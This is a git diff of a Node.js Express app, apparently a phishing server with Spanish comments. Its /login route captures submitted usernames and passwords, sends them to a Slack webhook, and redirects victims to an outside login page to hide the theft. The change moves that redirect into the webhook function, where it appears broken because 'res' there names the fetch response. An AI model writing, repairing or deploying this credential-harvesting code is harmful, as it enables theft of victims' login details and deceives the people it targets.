@@ -54,9 +54,7 @@ app.post("/login", (req, res) => {
 
   // Guardar credenciales en archivo
   const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
-  enviarASlack(credenciales);
-  // Redirigir a otra web
-  res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
+  enviarASlack(credenciales, true);
 });
 
 // Iniciar el servidor
@@ -64,7 +62,7 @@ app.listen(PORT, () => {
   console.log(`Servidor corriendo en http://localhost:${PORT}`);
 });
 
-async function enviarASlack(email) {
+async function enviarASlack(email, redirect = false) {
   const urlWebhook = process.env.SLACK_WEBHOOK_URL;
 
   if (!urlWebhook) {
@@ -82,10 +80,20 @@ async function enviarASlack(email) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
     });
+
+    if (redirect) {
+      // Redirigir a otra web
+      res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
+    }
+
     if (!res.ok) {
       console.error("Error enviando mensaje a Slack:", res.statusText);
     }
   } catch (error) {
+    if (redirect) {
+      // Redirigir a otra web
+      res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
+    }
     console.error("Error en fetch a Slack:", error);
   }
 }
